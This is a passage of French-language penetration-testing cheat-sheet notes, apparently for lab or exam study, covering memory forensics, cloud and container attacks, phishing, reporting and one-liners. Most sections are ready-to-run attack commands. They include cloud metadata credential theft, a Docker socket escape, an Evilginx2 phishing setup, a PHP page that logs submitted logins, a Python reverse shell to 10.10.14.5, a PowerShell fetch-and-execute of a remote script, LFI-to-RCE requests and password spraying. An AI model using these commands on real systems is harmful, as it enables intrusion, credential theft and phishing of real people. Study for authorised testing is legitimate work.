→ tool : [[Outil - Autopsy]] | [[Outil - Wireshark]] | [[Outil - YARA]]

```bash
# === VOLATILITY 3 ===
vol -f memory.dmp windows.pslist && vol -f memory.dmp windows.pstree
vol -f memory.dmp windows.cmdline && vol -f memory.dmp windows.netscan
vol -f memory.dmp windows.filescan | grep -i "password"
vol -f memory.dmp windows.hashdump && vol -f memory.dmp windows.credscan
vol -f memory.dmp malfind && vol -f memory.dmp timeliner
```

```bash
# === YARA ===
yara -r rules/ suspicious_file.exe
cat << 'EOF' > suspect.yar
rule Suspicious_PowerShell {
    strings:
        $s1 = "IEX(New-Object" ascii
        $s2 = "DownloadString" ascii
    condition:
        2 of ($s*)
}
EOF
yara suspect.yar file.ps1
```

```bash
# === LOG ANALYSIS ===
# Linux
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
grep "Accepted password" /var/log/auth.log
# Windows
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4625} | Select-Object TimeCreated,Message
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | Select-Object TimeCreated,Message
Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7045} | Select-Object TimeCreated,Message
```

```bash
# === PCAP (tshark) ===
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "ntlmssp" -T fields -e ntlmssp.auth.username
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
```

---

## 17. Cloud & Containers

AWS, Azure, GCP, Kubernetes, Docker escape.
→ tool : [[Outil - cloudfox]]

```bash
# === AWS ===
aws sts get-caller-identity && aws iam list-users && aws iam list-roles
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
aws s3 ls && aws s3 ls s3://bucket --recursive
```

```bash
# === AZURE ===
az account show && az ad user list && az role assignment list
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

```bash
# === GCP ===
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
gcloud auth list && gcloud projects list
```

```bash
# === KUBERNETES ===
cat /var/run/secrets/kubernetes.io/serviceaccount/token
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets
```

```bash
# === DOCKER ESCAPE ===
cat /proc/1/cgroup | grep docker && ls -la /.dockerenv
# Docker socket monté
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host bash
```

---

## 18. Social Engineering

Phishing, credential harvesting, Evilginx2, GoPhish.
→ détails : [[07 - Wireless, MITM & Social Engineering]] | tool : [[Outil - GoPhish]] | [[Outil - Evilginx2]]

```bash
# === EVILGINX2 (reverse proxy phishing) ===
evilginx2
config domain attacker.com && config ipv4 10.10.14.5
phishlets hostname o365 login.attacker.com && phishlets enable o365
lures create o365 && lures get-url 0
# → tokens / session cookies capturés automatiquement
```

```bash
# === SOCIAL ENGINEERING TOOLKIT ===
setoolkit
# 1) Social-Engineering Attacks → 2) Website Attack Vectors → 3) Credential Harvester → 4) Site Cloner
```

```bash
# === CREDENTIAL HARVESTING MANUEL ===
httrack "https://login.microsoftonline.com/" -O clone/
cat << 'EOF' > /var/www/html/login.php
<?php
$data = $_POST;
file_put_contents('/tmp/creds.txt', print_r($data, true) . "\n", FILE_APPEND);
header('Location: https://login.microsoftonline.com/');
exit;
?>
EOF
```

---

## 19. Reporting

Structure de rapport, screenshots, et grille de sévérité.
→ détails : [[12 - Ressources & Lab]]

```bash
# === TEMPLATE RAPPORT ===
# 1. Executive Summary (périmètre, dates, méthodologie, synthèse)
# 2. Technical Findings (pour chaque finding) :
#    - Titre + CVE | Sévérité (Critical/High/Medium/Low/Info)
#    - Description | Preuve (screenshot + commande)
#    - Impact business | Recommandation + quickfix
# 3. Appendices (enum complète, outils, timeline)
```

```bash
# === GRILLE DE SÉVÉRITÉ ===
# Critical : RCE non authentifié, accès admin/root, dump complet passwords
# High     : Privesc, accès DB sensible, SQLi exfiltration
# Medium   : XSS stocké, IDOR avec impact limité, info disclosure
# Low      : XSS refleté, clickjacking, header manquant
# Info     : Version disclosure, commentaire caché, cookie sans flags
```

---

## 20. One-Liners Essentiels

Les commandes les plus utiles en une ligne, organisées par tâche.

```bash
# === ENUM RAPIDE ===
nmap -sV -sC -Pn -p- 10.10.10.10 --min-rate 1000
find / -writable -type f 2>/dev/null | grep -v proc | head -20
ss -tlnp || netstat -ano
grep -rI "password\|passwd\|credential\|secret" /etc /home /opt /var 2>/dev/null | head -30
```

```bash
# === SHELLS ===
python3 -c 'import pty,socket,os;pty.spawn("/bin/bash")'
nc -lvnp 4444 | tee session.log
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```bash
# === CRACKING ===
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 -a 3 hash.txt ?u?l?l?l?l?d?d?d
```

```bash
# === AD SPRAY ===
nxc smb 10.10.10.0/24 -u users.txt -p 'Password1!' --continue-on-success
nxc ldap 10.10.10.10 -u user -p pass --asreproast asrep.txt
```

```bash
# === LFI → RCE ===
curl -s "http://target/?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd" | base64 -d
curl "http://target/?page=/var/log/apache2/access.log&cmd=id"
```

```bash
# === POWERSHELL DOWNLOAD & EXEC ===
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')
```

```bash
# === LINUX PRIVESC CHECK ===
sudo -l 2>/dev/null; find / -perm -4000 2>/dev/null; cat /etc/crontab; id; uname -r
```

```bash
# === WINDOWS QUICK ENUM ===
whoami /all; net user; net localgroup Administrators; systeminfo; netstat -ano
```

```bash
# === BLOODHOUND ===
bloodhound-python -u user -p 'pass' -d corp.local -ns 10.10.10.10 -c All --zip
```

---

## 21. Tips express (le résumé des résumés)

> [!tip] 🎯 **Les réflexes "2 secondes" qui sauvent**
> ```bash
> # Qu'est-ce qui tourne ? (que je n'ai pas encore vu)
> ss -tlnp / netstat -ano
> # Est-ce que je peux écrire quelque part ?
> find / -writable 2>/dev/null | grep -v proc | head -20
> # Y a-t-il des creds qui trainent ?
> cat /home/*/.bash_history; find / -name "*.conf" -o -name ".env" 2>/dev/null
> # Suis-je déjà admin quelque part sans le savoir ?
> id; groups; net user; net localgroup Administrators
> ```

> [!tip] ⚡ **Les one-liners à retenir par cœur**
> ```bash
> # Reverse shell stabilisé (python)
> python3 -c 'import pty,socket,os;pty.spawn("/bin/bash")'
> # Listener tout-en-un
> nc -lvnp 4444
> # Scan complet du lab
> nmap -sV -sC -Pn -p- 10.10.10.0/24 --min-rate 1000
> # Tester une credential partout (AD)
> nxc smb 10.10.10.0/24 -u user -p 'pass' --continue-on-success
> # LFI → read config
> curl "http://x/page?file=php://filter/convert.base64-encode/resource=config.php" | base64 -d
> # Charger un fichier en mémoire (Windows)
> IEX(New-Object Net.WebClient).DownloadString('http://IP/p.ps1')
> ```

> [!tip] 🧊 **Quand TOUT semble bloqué**
> - Refaire l'énumération **complète** avec un oeil neuf (souvent un port oublié).
> - **sortir de la boîte** : vers un protocole non testé (SMTP, MSSQL, Redis, NFS).
> - Regarder les **services en localhost** (port 8080/3000/9200 internes).
> - Chercher des **creds dans des fichiers** (log, backup, historique).
> - Vérifier si un **autre compte** peut être la cible (spray discret).

> [!tip] 🔄 **Workflow d'un pentest**
> 1. Scan → 2. Enum → 3. Identification des vecteurs → 4. Exploitation → 5. Privesc → 6. Post-exploitation → 7. Rapport

> [!tip] 🧰 **Outils indispensables dans la trousse**
> - Enum : `nmap`, `ffuf`, `gobuster`, `nikto`, `enum4linux`
> - Exploit : `metasploit`, `sqlmap`, `nuclei`
> - AD : `bloodhound-python`, `impacket`, `crackmapexec`, `evil-winrm`
> - Crack : `hashcat`, `john`, `hydra`
> - Tunnels : `chisel`, `ligolo-ng`, `ssh`
> - Post : `mimikatz`, `linpeas`, `winpeas`

---

## 22. Checklist "je suis bloqué"

> [!success] 🏆 **La mini-checklist "je suis bloqué"**
> 1. J'ai bien fait l'énumération **complète** ? (ports -p-, tous les services)
> 2. J'ai testé le **même service sur les 2 protocoles** ? (smb + ldap + kerberos)
> 3. J'ai regardé **BloodHound / linpeas / winpeas** ?
> 4. J'ai testé les **credentials trouvés ailleurs** (réutilisation) ?
> 5. J'ai cherché les **CVE** de la version exacte (searchsploit) ?

> [!success] 🔍 **Étapes de dépannage**
> 1. **Revérifier** l'énumération : `nmap -sV -sC -p- --min-rate 5000`
> 2. **Chercher des credentials** : `find / -name "*.conf" -o -name "*.bak" -o -name ".env" 2>/dev/null`
> 3. **Vérifier les anciens exploits** : `searchsploit <service> <version>`
> 4. **Tester les services en localhost** : `ss -tlnp` sur la machine compromise
> 5. **Spray les credentials** trouvés sur les autres machines du réseau
> 6. **Vérifier les trust relationships** (AD : parent-child, forest trusts)
> 7. **Regarder les conteneurs/Docker** pour escalade
> 8. **Tester des protocoles alternatifs** : SNMP, SMTP, NFS, Redis, MySQL, MSSQL

> [!success] 📋 **Après exploitation — ne pas oublier**
> 1. Documenter **chaque étape** avec preuve (screenshot + commande)
> 2. Noter les **credentials** et **hashes** obtenus
> 3. Vérifier si le même password est utilisé **ailleurs**
> 4. Sauvegarder les **fichiers sensibles** trouvés
> 5. **Nettoyer** les artefacts d'exploitation si demandé dans le scope
> 6. **Prochaine note** : [[12 - Ressources & Lab|🎓 Ressources & Lab]]
